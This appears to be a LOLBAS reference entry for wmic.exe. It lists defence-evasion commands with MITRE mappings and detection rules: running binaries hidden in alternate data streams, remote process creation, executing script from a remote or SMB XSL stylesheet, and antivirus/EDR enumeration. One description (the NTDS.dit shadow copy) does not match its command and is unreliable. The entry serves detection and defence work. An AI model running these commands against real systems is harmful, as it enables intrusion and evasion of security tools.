---
Acknowledgement:
- Handle: '@subtee'
  Person: Casey Smith
- Person: Avihay El
Author: Oddvar Moe
Commands:
- Category: ADS
  Command: wmic.exe process call create "{PATH_ABSOLUTE}:program.exe"
  Description: Execute a .EXE file stored as an Alternate Data Stream (ADS)
  MitreID: T1564.004
  OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows
    11
  Privileges: User
  Tags:
  - Execute: EXE
  Usecase: Execute binary file hidden in Alternate data streams to evade defensive
    counter measures
- Category: Execute
  Command: wmic.exe process call create "{CMD}"
  Description: Execute calc from wmic
  MitreID: T1218
  OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows
    11
  Privileges: User
  Tags:
  - Execute: CMD
  Usecase: Execute binary from wmic to evade defensive counter measures
- Category: Execute
  Command: wmic.exe /node:"192.168.0.1" process call create "{CMD}"
  Description: Execute evil.exe on the remote system.
  MitreID: T1218
  OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows
    11
  Privileges: User
  Tags:
  - Execute: CMD
  - Execute: Remote
  Usecase: Execute binary on a remote system
- Category: Execute
  Command: wmic.exe process get brief /format:"{REMOTEURL:.xsl}"
  Description: Create a volume shadow copy of NTDS.dit that can be copied.
  MitreID: T1218
  OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows
    11
  Privileges: User
  Tags:
  - Execute: XSL
  - Execute: Remote
  Usecase: Execute binary on remote system
- Category: Execute
  Command: wmic.exe process get brief /format:"{PATH_SMB:.xsl}"
  Description: Executes JScript or VBScript embedded in the target remote XSL stylsheet.
  MitreID: T1218
  OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows
    11
  Privileges: User
  Tags:
  - Execute: XSL
  - Execute: Remote
  Usecase: Execute script from remote system
- Category: Copy
  Command: wmic.exe datafile where "Name='C:\\windows\\system32\\calc.exe'" call Copy
    "C:\\users\\public\\calc.exe"
  Description: Copy file from source to destination.
  MitreID: T1105
  OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows
    11
  Privileges: User
  Usecase: Copy file.
- Category: Execute
  Command: WMIC.exe /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get
    displayName,productState
  Description: Executes WMIC to gather the existing Antivirus or EDR solution installed
    on the machine.
  MitreID: T1518.001
  OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows
    11
  Privileges: User
  Tags:
  - Execute: Discovery
  - Execute: Antivirus Enumeration
  Usecase: Recon
Created: 2018-05-25
Description: The WMI command-line (WMIC) utility provides a command-line interface
  for WMI
Detection:
- Sigma: https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/image_load/image_load_wmic_remote_xsl_scripting_dlls.yml
- Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_wmic_xsl_script_processing.yml
- Sigma: https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_wmic_squiblytwo_bypass.yml
- Sigma: https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_wmic_eventconsumer_creation.yml
- Elastic: https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_suspicious_wmi_script.toml
- Elastic: https://github.com/elastic/detection-rules/blob/61afb1c1c0c3f50637b1bb194f3e6fb09f476e50/rules/windows/persistence_via_windows_management_instrumentation_event_subscription.toml
- Elastic: https://github.com/elastic/detection-rules/blob/82ec6ac1eeb62a1383792719a1943b551264ed16/rules/windows/defense_evasion_suspicious_managedcode_host_process.toml
- Splunk: https://github.com/splunk/security_content/blob/961a81d4a5cb5c5febec4894d6d812497171a85c/detections/endpoint/xsl_script_execution_with_wmic.yml
- Splunk: https://github.com/splunk/security_content/blob/3f77e24974239fcb7a339080a1a483e6bad84a82/detections/endpoint/remote_wmi_command_attempt.yml
- Splunk: https://github.com/splunk/security_content/blob/3f77e24974239fcb7a339080a1a483e6bad84a82/detections/endpoint/remote_process_instantiation_via_wmi.yml
- Splunk: https://github.com/splunk/security_content/blob/08ed88bd88259c03c771c30170d2934ed0a8f878/detections/endpoint/process_execution_via_wmi.yml
- BlockRule: https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules
- IOC: Wmic retrieving scripts from remote system/Internet location
- IOC: DotNet CLR libraries loaded into wmic.exe
- IOC: DotNet CLR Usage Log - wmic.exe.log
- IOC: wmiprvse.exe writing files
Full_Path:
- Path: C:\Windows\System32\wbem\wmic.exe
- Path: C:\Windows\SysWOW64\wbem\wmic.exe
Name: Wmic.exe
Resources:
- Link: https://stackoverflow.com/questions/24658745/wmic-how-to-use-process-call-create-with-a-specific-working-directory
- Link: https://subt0x11.blogspot.no/2018/04/wmicexe-whitelisting-bypass-hacking.html
- Link: https://twitter.com/subTee/status/986234811944648707
- Link: https://research.kudelskisecurity.com/2025/04/30/unmasking-blackbasta-inside-the-ransomware-syndicates-leaked-operations/
mitre_data:
  technique_ids:
  - T1564.004
  - T1218
  - T1105
  - T1518.001
tags:
- lolbas/osbinaries
---

# Wmic.exe

The WMI command-line (WMIC) utility provides a command-line interface for WMI

# Path(s)

- `C:\Windows\System32\wbem\wmic.exe`
- `C:\Windows\SysWOW64\wbem\wmic.exe`

# ADS Commands

Execute a .EXE file stored as an Alternate Data Stream (ADS)

```batch
wmic.exe process call create "{PATH_ABSOLUTE}:program.exe"
```

- **Usecase:** Execute binary file hidden in Alternate data streams to evade defensive counter measures
- **Privileges Required:** User
- **MitreID:** `T1564.004`
- **Operating System(s):** Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11



# Copy Commands

Copy file from source to destination.

```batch
wmic.exe datafile where "Name='C:\\windows\\system32\\calc.exe'" call Copy "C:\\users\\public\\calc.exe"
```

- **Usecase:** Copy file.
- **Privileges Required:** User
- **MitreID:** `T1105`
- **Operating System(s):** Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11



# Execute Commands

Execute calc from wmic

```batch
wmic.exe process call create "{CMD}"
```

- **Usecase:** Execute binary from wmic to evade defensive counter measures
- **Privileges Required:** User
- **MitreID:** `T1218`
- **Operating System(s):** Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11



Execute evil.exe on the remote system.

```batch
wmic.exe /node:"192.168.0.1" process call create "{CMD}"
```

- **Usecase:** Execute binary on a remote system
- **Privileges Required:** User
- **MitreID:** `T1218`
- **Operating System(s):** Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11



Create a volume shadow copy of NTDS.dit that can be copied.

```batch
wmic.exe process get brief /format:"{REMOTEURL:.xsl}"
```

- **Usecase:** Execute binary on remote system
- **Privileges Required:** User
- **MitreID:** `T1218`
- **Operating System(s):** Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11



Executes JScript or VBScript embedded in the target remote XSL stylsheet.

```batch
wmic.exe process get brief /format:"{PATH_SMB:.xsl}"
```

- **Usecase:** Execute script from remote system
- **Privileges Required:** User
- **MitreID:** `T1218`
- **Operating System(s):** Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11



Executes WMIC to gather the existing Antivirus or EDR solution installed on the machine.

```batch
WMIC.exe /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName,productState
```

- **Usecase:** Recon
- **Privileges Required:** User
- **MitreID:** `T1518.001`
- **Operating System(s):** Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11



# Resource(s)

- https://stackoverflow.com/questions/24658745/wmic-how-to-use-process-call-create-with-a-specific-working-directory
- https://subt0x11.blogspot.no/2018/04/wmicexe-whitelisting-bypass-hacking.html
- https://twitter.com/subTee/status/986234811944648707
- https://research.kudelskisecurity.com/2025/04/30/unmasking-blackbasta-inside-the-ransomware-syndicates-leaked-operations/
# Acknowledgements

- Oddvar Moe (Authored, 2018-05-25)
- Casey Smith (@subtee)
- Avihay El